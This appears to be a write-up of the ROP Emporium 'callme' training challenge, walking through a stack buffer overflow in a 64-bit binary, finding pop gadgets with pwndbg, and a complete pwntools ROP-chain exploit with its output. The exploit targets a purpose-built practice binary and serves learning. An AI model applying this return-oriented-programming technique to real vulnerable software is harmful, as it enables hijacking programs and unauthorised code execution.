# callme

## First look

```console
┌──(vein㉿vein)-[~/rop_emporium/callme]
└─$ checksec callme    
[*] '/home/vein/rop_emporium/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
```console
┌──(vein㉿vein)-[~/rop_emporium/callme]
└─$ ./callme    
callme by ROP Emporium
x86_64

Hope you read the instructions...

> test
Thank you!

Exiting
```
The NX is enabled so it prevents running code into the stack, so we can't do a shellcode attack

## Static Analysis

```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("callme by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

```c
void pwnme(void)

{
  undefined local_28 [32];
  
  memset(local_28,0,0x20);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,local_28,0x200);
  puts("Thank you!");
  return;
}
```
```c
void usefulFunction(void)

{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
We open Ghidra and we saw that a pwnme() function is called by the main. \
We see that has a buffer overflow in the local_28 variable cause it's 32 bytes long \
and the read() takes up to 512 = 0x200

# Exploitation
Challennge description says that to take the flag we must call \
callme_one(), callme_two() and callme_three() functions in that order, each with the arguments:
```text
0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
```
To achieve this we want some rop gadgets to pop the values into the stack. \
For our luck, we found a hide funtion inside pwndbg that has the gadgets that we need. \
Either way we could found them with ropper.
```asm
┌──(vein㉿vein)-[~/rop_emporium/callme]
└─$ gdb-pwndbg callme
Reading symbols from callme...
(No debugging symbols found in callme)
pwndbg: loaded 141 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
GDB's set directories <path> parameter can be used to debug e.g. glibc sources like the malloc/free functions!
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
pwndbg> disassemble usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:     pop    rdi
   0x000000000040093d <+1>:     pop    rsi
   0x000000000040093e <+2>:     pop    rdx
   0x000000000040093f <+3>:     ret
End of assembler dump.
```

So, now we are ready to craft our payload.
Here is the python script
```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./callme', checksec=False)
p = process()
context.log_level = 'info' # i put it in debug mode for when testing

offset = b'a' * 40 # found with pwndbg

# pop rdi; pop rsi; pop rdx; ret;
pop_gadgets = 0x40093c

# payload for each one callme function with their parameters
payload1 = offset
payload1 += p64(pop_gadgets)
payload1 += p64(0xdeadbeefdeadbeef)
payload1 += p64(0xcafebabecafebabe)
payload1 += p64(0xd00df00dd00df00d)
payload1 += p64(elf.symbols.callme_one)

payload2 = p64(pop_gadgets)
payload2 += p64(0xdeadbeefdeadbeef)
payload2 += p64(0xcafebabecafebabe)
payload2 += p64(0xd00df00dd00df00d)
payload2 += p64(elf.symbols.callme_two)

payload3 = p64(pop_gadgets)
payload3 += p64(0xdeadbeefdeadbeef)
payload3 += p64(0xcafebabecafebabe)
payload3 += p64(0xd00df00dd00df00d)
payload3 += p64(elf.symbols.callme_three)

# craft the final payload
payload = payload1 + payload2 + payload3

p.sendlineafter(b'>', payload)
log.info(p.recvall())
```
```console
┌──(vein㉿vein)-[~/rop_emporium/callme]
└─$ ./exploit.py   
[+] Starting local process '/home/vein/rop_emporium/callme/callme': pid 12129
[+] Receiving all data: Done (105B)
[*] Process '/home/vein/rop_emporium/callme/callme' stopped with exit code 0 (pid 12129)
/home/vein/.local/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is nots
  self._log(logging.INFO, message, args, kwargs, 'info')
[*]  Thank you!
    callme_one() called correctly
    callme_two() called correctly
    ROPE{a_placeholder_32byte_flag!}
```
